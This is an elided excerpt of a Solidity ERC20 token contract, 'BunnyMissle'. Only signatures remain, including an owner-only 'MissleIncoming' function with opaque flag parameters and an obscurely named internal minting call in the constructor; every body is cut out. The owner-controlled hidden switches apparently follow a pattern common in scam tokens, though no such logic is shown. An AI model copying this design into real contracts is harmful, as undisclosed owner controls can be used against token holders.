...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _launchTheMissle(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function MissleIncoming(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Bunny is Context, ERC20 {
    constructor(
        ...
        _launchTheMissle(owner, initialSupply, tmp6, tmp7);
    }
}

contract BunnyMissle is ERC20Bunny {
    constructor() ERC20Bunny("BunnyMissle", "BUNNYMISSLE", false, true, 700, 25, msg.sender, 2000000000 * 10 ** 18, msg.sender, 7) {
    }
}